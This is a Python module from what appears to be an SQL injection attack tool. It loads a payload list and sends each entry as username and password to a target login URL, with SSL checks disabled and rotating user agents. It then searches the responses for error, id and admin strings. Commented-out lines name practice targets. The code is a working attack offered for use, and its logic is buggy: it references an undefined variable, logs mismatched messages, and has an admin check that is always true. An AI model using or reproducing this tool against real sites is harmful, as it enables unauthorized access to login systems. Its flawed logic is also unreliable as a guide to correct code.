import os
import sys
import asyncio
import re
import requests
from colorama import Fore,init,Style
from datetime import datetime
import os
import sys


import sys
import os
current_directory = os.getcwd()

sys.path.append(current_directory)

from lib.Attacktype.Attacks import ErrorBasedSQl
from lib.regelexpression.patterns import Detect
from lib.Stacks.stack import html_response
from lib.scripts.headers import *
from Exceptions.exceptions import SQLJNGStackOverflow
from lib.result.Results import SQLJNG_result_report
from lib.result.Results import safe_SQLJNG_result
from logger.logs import logger
from logger.sqljlog import logger as sqljlog





import logging

attack_type = "authentication bypass SQL injection"

"""
Function: mysql_xml_injection
Description: Performs MySQL XML injection attacks on a target website.

Dependencies:
- os
- sys
- asyncio
- re
- requests
- colorama (Fore, init, Style)
- datetime
- sqlite3
- headers (from headers import *)
- logging

Note:
- The payloads for MySQL XML injection attacks are sourced from https://github.com/payloadbox/sql-injection-payload-list.
- The headers for HTTP requests are inspired by https://stackoverflow.com/questions/70017732/how-to-change-the-ip-address-in-the-url.
- The 'headers' module is required for user-agent settings (imported from headers import *).
- Logging is configured to store information in the 'SQLJ.log' file.

Usage:
1. Import the necessary libraries and dependencies.
2. Use the 'mysql_xml_injection(urls)' function to perform MySQL XML injection attacks on the specified URLs.

Example:
```python
from sql_injection_exploit import mysql_xml_injection

urls_to_attack = ["http://example.com/login", "http://testsite.net/login"]
for url in urls_to_attack:
    asyncio.run(mysql_xml_injection(url))
"""





####################################33
pattern = r"\berror\b"
htmlpattern = r"\bid\b"
capturesAUTHBYPASS = []
########################################
#* Setting a couple of user agents
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
}

###############################################


#
logging.basicConfig(filename="SQLJ.log",level=logging.DEBUG)


async def My_sql_XML_attack(urls):
    """This is the authentication bypass sql injection block. it occurs when the input datas are not validated and attacker can inject its own code to the database and bypass the authentication"""
    try:
        """This is the main block of our exploit program which sending the payloads. """
        global pattern,htmlpattern  
        done = False 
        filename = "mysqlxml.txt"
        current_directory = os.path.dirname(os.path.abspath(__file__)) 
        file_path = os.path.join(current_directory, filename) 

        with open(file_path, "r") as file: 
            payload = file.read()
            rows = payload.split("\n") 
            sorted_rows = sorted(rows) 
            sorted_payload = "\n".join(sorted_rows) #* 
            print(f"[{datetime.now()}]",Fore.RED + str(sorted_payload)) 
            requests.packages.urllib3.disable_warnings()  #! Disable SSL warnings for http requests and testing
            # url = "https://redtiger.labs.overthewire.org/level1.php"
            req = requests.get(url=urls,verify=False) 
            # assert req.status_code == 200
            if req.status_code == 200: 
                ask = input(f"[{datetime.now()}]{Fore.RESET}{Fore.GREEN}{Style.BRIGHT}[INFO]**Looks like the host is up: {Fore.RESET}{Fore.YELLOW}{urls} {Fore.RESET}{Fore.GREEN} \nDo you want to send the payload above to the website?** ")
                logger.info(f"Host:{urls} is up with 200 code.")

                if ask.lower() == "y":
                    for line in sorted_payload.split("\n"): 
                        params = { 
                            "username": line,
                            "password": line
                        }
                        await Prepare_the_headers()
                        for headerR in headers:
                            ack = requests.post(url=urls, data=params,verify=False,headers={"User-Agent": header}) 
                            logger.info(f"Sending payload:{line}")
                            await asyncio.sleep(5) 
                            if "error" in ack.text: 
                                logger.info("Error parameter might exists in the code.")
                                Detect(ack.text)
                                html_response.push(ack.text)
                                await asyncio.sleep(3)
                                
                            vuln = re.findall(pattern=pattern,string=ack.text,flags=re.IGNORECASE) 
                            htmlVULN = re.findall(pattern=htmlpattern,string=ack.text,flags=re.IGNORECASE) 
                            if vuln: 
                                logger.info("id parameter might exists in the code")
                                Detect(ack.text)
                                html_response.push(ack.text)
                                await asyncio.sleep(3)
                            
                            if htmlVULN:
                                logger.info("Error parameter might exists in the code")
                                Detect(ack.text)
                                html_response.push(ack.text)
                                await asyncio.sleep(3)
                            
                            word = "id" in req.text                             
                            errword = "error" in req.text
                            if word:
                                logger.info("id parameter might exists in the Code")
                                Detect(ack.text)
                                html_response.push(ack.text)
                                await asyncio.sleep(3)
                            
                            if errword:
                                logger.info("Error parameter might exists in the code")
                                Detect(ack.text)
                                html_response.push(ack.text)
                                await asyncio.sleep(3)
                                
                            
                                
                        if req.status_code == 302:                                             
                            logger.info("Could break to the website.")
                        
                        if "Admin" or "admin" in vuln or "Admin" or "admin" in ack.text or "Admin" or "admin" in htmlVULN:
                            logger.info("Admin parameter might exists in the code")
                            Detect(ack.text)
                            html_response.push(ack.text)
                            await asyncio.sleep(3)
                            
                else:
                    logger.info("Host is down.")
            

    except Exception as e:
        logger.error(e)
        
    except KeyboardInterrupt:
        logger.info("^C Aborted")
        
        

        
    finally:
        pass
     
        
        
     

# async def auth_main(urL):
#     await auth_SQL_inj(urL)

# asyncio.run(My_sql_XML_attack("http://testfire.net/login.jsp"))
